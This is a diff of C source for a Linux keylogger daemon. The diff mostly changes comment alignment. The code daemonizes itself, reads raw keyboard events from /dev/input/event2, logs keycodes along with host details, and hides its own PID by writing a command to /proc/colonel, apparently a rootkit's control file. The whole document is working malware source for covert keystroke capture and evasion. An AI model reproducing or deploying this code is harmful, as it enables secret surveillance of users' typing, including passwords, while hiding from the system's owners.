@@ -14,30 +14,30 @@
 #include <fcntl.h>
 #include <stdarg.h>
 
-FILE *error_log = NULL;										/* error log */
+FILE *error_log = NULL;									/* error log */
 
 
 void daemonize(void) {
 	pid_t process_id = 0;
 	pid_t sid = 0;
-	process_id = fork();									/* fork a child process */
+	process_id = fork();								/* fork a child process */
 
 	if (process_id < 0) {
 		printf("ERROR: fork failure\n");
 		exit(1);
 	}
-	if (process_id > 0) {									/* exits the parent process */
+	if (process_id > 0) {								/* exits the parent process */
 		exit(0);
 	}
 
-	umask(0);												/* unmask the file mode */
-	sid = setsid();											/* set unique session for 
-															 * child process */
+	umask(0);									/* unmask the file mode */
+	sid = setsid();									/* set unique session for 
+											 * child process */
 	if (sid < 0) {
 		exit(1);
 	}
 
-	chdir("/opt/");											/* change daemon working directory */
+	chdir("/opt/");									/* change daemon working directory */
 
 	close(STDIN_FILENO);
 	close(STDOUT_FILENO);
@@ -46,15 +46,15 @@ void daemonize(void) {
 }
 
 int setup_dirs(void) {
-    return mkdir("./col_log", S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);     /* log directory */
+    return mkdir("./col_log", S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);		/* log directory */
 }
 
 int hide_pid(void) {
 	char dpid[10];								 	
-	pid_t child_pid = getpid();							                     /* get keylogger pid */
+	pid_t child_pid = getpid();							/* get keylogger pid */
 	int control_file;
 	time_t curtime;
-	time(&curtime); // set the current time
+	time(&curtime);									/* set the current time */
 	
        	control_file = open("/proc/colonel", O_WRONLY);					/* open for write to hide keylogger pid */
 
@@ -63,9 +63,9 @@ int hide_pid(void) {
 		exit(1);
 	}
 
-	sprintf(dpid, "hp%jd", (intmax_t)child_pid);			                 /* forms command */
-	write(control_file, dpid, sizeof(dpid));						                 /* passes command to the colonel */
-	fprintf(error_log, "PID: %jd -- %s", (intmax_t)child_pid, ctime(&curtime));     /* records current pid to log */
+	sprintf(dpid, "hp%jd", (intmax_t)child_pid);			                /* forms command */
+	write(control_file, dpid, sizeof(dpid));			                /* passes command to the colonel */
+	fprintf(error_log, "PID: %jd -- %s", (intmax_t)child_pid, ctime(&curtime));	/* records current pid to log */
 	close(control_file);
 	return 0;
 }
@@ -75,24 +75,20 @@ int main(void) {
 	int control_file;
 	int input_device;								/* will read from device event file */
 	int dir;									/* log directory */
-	struct utsname unameData;								/* struct provides system information */
-	uname(&unameData);										/* provides system information */
-	char listening = 1;										/* toggles keylogger on/off */
-	char cmd[1024];											/* stores commands */
-	char kl[13] = "keylogger: 1";							/* defines what keylogger is listening for 
-															 * on /proc/colonel */
-	char *toggle;											/* listens for keylogger cmd */
-	struct input_event ev;									/* using input_event so we know 
-
-															 * what we're reading from the 
-															 * event file */
+	struct utsname unameData;							/* struct provides system information */
+	uname(&unameData);								/* provides system information */
+	char listening = 1;								/* toggles keylogger on/off */
+	char cmd[1024];									/* stores commands */
+	char kl[13] = "keylogger: 1";							/* defines what keylogger is listening for on /proc/colonel */
+	char *toggle;									/* listens for keylogger cmd */
+	struct input_event ev;								/* using input_event so we know what we're reading from the event file */
 	time_t curtime;
 
 	daemonize();
 	setup_dirs();
 
-	error_log = fopen("./col_log/log.txt", "a+"); 					                       /* daemon log */
-	input_device = open("/dev/input/event2", O_RDONLY);			                           /* key event file */
+	error_log = fopen("./col_log/log.txt", "a+"); 					/* daemon log */
+	input_device = open("/dev/input/event2", O_RDONLY);			        /* key event file */
 
 	hide_pid();
 
@@ -104,29 +100,29 @@ int main(void) {
 /*
 * DYNAMICALLY DISCOVER CORRECT EVENT (/proc/bus/input/devices) 327
 */	fprintf(error_log, "NOT ROOT! -- listening: %d", listening);
-	if (geteuid() != 0) {									                 /* check if user is root */
+	if (geteuid() != 0) {								/* check if user is root */
 		fprintf(error_log, "ERROR: user not root -- %s", ctime(&curtime));
 		return 1;
 	}
     fprintf(error_log, "JUST KIDDING, NOT WHILE -- listening: %d", listening);
 	while(1) {				
 		fflush(error_log);
-		read(input_device, &ev, sizeof(struct input_event));			                  /* read from /dev/input/eventX */
-		control_file = open("/proc/colonel", O_RDONLY);                               /* read from /proc/colonel */
-		read(control_file, cmd, sizeof(cmd));						                  /* read from /proc/colonel */
-		toggle = strstr(cmd, kl);							                  /* looks for change in /proc/colonel */
+		read(input_device, &ev, sizeof(struct input_event));	                /* read from /dev/input/eventX */
+		control_file = open("/proc/colonel", O_RDONLY);                         /* read from /proc/colonel */
+		read(control_file, cmd, sizeof(cmd));			                /* read from /proc/colonel */
+		toggle = strstr(cmd, kl);				                /* looks for change in /proc/colonel */
         fprintf(error_log, "In while (no if), control_file open and reading -- listening: %d, toggle: %s", listening, toggle);
 
 		if ((0 == listening) && (toggle != NULL)) {
             fprintf(error_log, "In 1st if -- listening: %d, toggle: %s", listening, toggle);
 			listening = !listening;
-            evlog = fopen("./col_log/evlog.txt", "a+");                       /* key log */
+            evlog = fopen("./col_log/evlog.txt", "a+");                       		/* key log */
             if (NULL == evlog) {
                 fprintf(error_log, "ERROR: evlog couldn't be opened -- %s", ctime(&curtime));
                 return 1;
             }
-			fprintf(evlog, "\n\n%s", ctime(&curtime));				          /* timestamp */
-			fprintf(evlog, "%s\n%s\n%s | %s | %s\n\n-", 			          /* system data */
+			fprintf(evlog, "\n\n%s", ctime(&curtime));		        /* timestamp */
+			fprintf(evlog, "%s\n%s\n%s | %s | %s\n\n-", 	                /* system data */
 					unameData.nodename, unameData.version,
 					unameData.sysname, unameData.release, 
 					unameData.machine);
@@ -136,11 +132,9 @@ int main(void) {
             fprintf(error_log, "Leaving 1st if, control_file closed -- listening: %d, toggle: %s", listening, toggle);
 			continue;
 
-		} else if ((1 == ev.type) && (1 == listening)) {	                  /* if typing (ev.type = 1) and keylogger is on */
+		} else if ((1 == ev.type) && (1 == listening)) {	                /* if typing (ev.type = 1) and keylogger is on */
 			fprintf(error_log, "In 2nd if, control_file still closed -- listening: %d, toggle: %s", listening, toggle);
-            fprintf(evlog, "%i,%i-", ev.code, ev.value);	                  /* grabs keyboard input -- 
-                    														   * ev.code = keycode
-                    														   * ev.value = key state (0: key up, 1: key down) */
+            fprintf(evlog, "%i,%i-", ev.code, ev.value);	              		/* grabs keyboard input -- ev.code = keycode, ev.value = key state (0: key up, 1: key down) */
 			fflush(evlog);
 
 			control_file = open("/proc/colonel", O_RDONLY | O_NONBLOCK);
